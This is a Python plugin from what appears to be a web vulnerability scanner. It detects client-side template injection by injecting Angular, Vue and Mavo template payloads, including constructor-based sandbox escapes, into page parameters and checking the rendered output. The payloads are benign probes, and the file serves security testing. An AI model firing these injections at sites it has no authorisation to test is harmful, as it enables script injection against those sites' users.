"""Client-Side Template Injection (CSTI) detection plugin."""

from typing import List, Optional
import httpx

from plugins.base import BasePlugin
from core.models import Finding, CrawledEndpoint, SeverityLevel, AttackType, AttackPrimitive


# CSTI payloads per client-side framework
CSTI_PAYLOADS = {
    "angular": [
        {"payload": "{{constructor.constructor('return document.domain')()}}", "expected_eval": True},
        {"payload": "{{$on.constructor('return document.domain')()}}", "expected_eval": True},
        {"payload": "{{7*7}}", "expected_text": "49"},
        {"payload": "{{constructor.constructor('return 1+1')()}}", "expected_text": "2"},
    ],
    "vue": [
        {"payload": "{{_c.constructor('return document.domain')()}}", "expected_eval": True},
        {"payload": "{{constructor.constructor('return 1')()}}", "expected_text": "1"},
        {"payload": "{{7*7}}", "expected_text": "49"},
    ],
    "mavo": [
        {"payload": "[7*7]", "expected_text": "49"},
        {"payload": "[1+1]", "expected_text": "2"},
    ],
    "generic": [
        {"payload": "{{7*7}}", "expected_text": "49"},
        {"payload": "${7*7}", "expected_text": "49"},
    ],
}


class CSTIPlugin(BasePlugin):
    name = "csti"
    description = "Client-Side Template Injection detection (requires Playwright context)"

    async def detect(
        self,
        endpoint: CrawledEndpoint,
        session: httpx.AsyncClient,
        context: Optional[dict] = None,
    ) -> List[Finding]:
        findings = []

        params_to_test = {}
        if endpoint.params:
            params_to_test.update(endpoint.params)
        if endpoint.form_data:
            params_to_test.update(endpoint.form_data)

        if not params_to_test:
            return findings

        # Determine which framework payloads to use
        framework = endpoint.framework or "generic"
        payloads = CSTI_PAYLOADS.get(framework, CSTI_PAYLOADS["generic"])

        # If no Playwright context, fall back to response-based detection
        page = context.get("page") if context else None

        for param_name, original_value in params_to_test.items():
            for test in payloads:
                payload = test["payload"]
                expected_text = test.get("expected_text")

                if page:
                    # Playwright-based: check rendered DOM
                    finding = await self._test_with_playwright(
                        page, endpoint, param_name, payload, expected_text, framework
                    )
                else:
                    # Fallback: check HTTP response
                    finding = await self._test_via_http(
                        session, endpoint, param_name, payload, expected_text, framework
                    )

                if finding:
                    findings.append(finding)
                    break  # One finding per parameter

        return findings

    async def _test_with_playwright(
        self, page, endpoint, param_name, payload, expected_text, framework
    ) -> Optional[Finding]:
        """Test CSTI using Playwright to check rendered DOM."""
        try:
            from urllib.parse import urlencode, urlparse, urlunparse, parse_qs

            # Build URL with injected payload
            parsed = urlparse(endpoint.url)
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            await page.goto(test_url, wait_until="networkidle", timeout=10000)
            await page.wait_for_timeout(1000)  # Wait for client-side rendering

            # Check rendered DOM
            body_text = await page.evaluate("document.body.innerText")

            if expected_text and expected_text in body_text:
                # Verify it's not in the source (proving client-side rendering)
                page_source = await page.content()
                if expected_text not in page_source.split("<script")[0]:
                    return Finding(
                        vuln_type=AttackType.CSTI,
                        severity=SeverityLevel.HIGH,
                        url=endpoint.url,
                        method=endpoint.method,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"CSTI payload rendered in DOM: '{payload}' → '{expected_text}' (framework: {framework})",
                        description=f"Client-Side Template Injection in '{param_name}'. The {framework} framework evaluates user input as template expression.",
                        cvss_score=7.5,
                        owasp_category="A03:2021 - Injection",
                        primitive=AttackPrimitive.SESSION_HIJACK,
                    )
        except Exception:
            pass
        return None

    async def _test_via_http(
        self, session, endpoint, param_name, payload, expected_text, framework
    ) -> Optional[Finding]:
        """Fallback: test CSTI via HTTP response (less accurate)."""
        if endpoint.method == "POST" and endpoint.form_data:
            data = dict(endpoint.form_data)
            data[param_name] = payload
            response = await self._send_request(
                session, endpoint.url, method="POST", data=data
            )
        else:
            params = dict(endpoint.params) if endpoint.params else {}
            params[param_name] = payload
            response = await self._send_request(
                session, endpoint.url, params=params
            )

        if response and expected_text and expected_text in response.text:
            return Finding(
                vuln_type=AttackType.CSTI,
                severity=SeverityLevel.MEDIUM,
                url=endpoint.url,
                method=endpoint.method,
                parameter=param_name,
                payload=payload,
                evidence=f"Template expression possibly evaluated: '{payload}' → '{expected_text}' in response",
                description=f"Potential CSTI in '{param_name}' ({framework} framework detected). Verify with browser.",
                cvss_score=6.5,
                owasp_category="A03:2021 - Injection",
                primitive=AttackPrimitive.SESSION_HIJACK,
            )
        return None
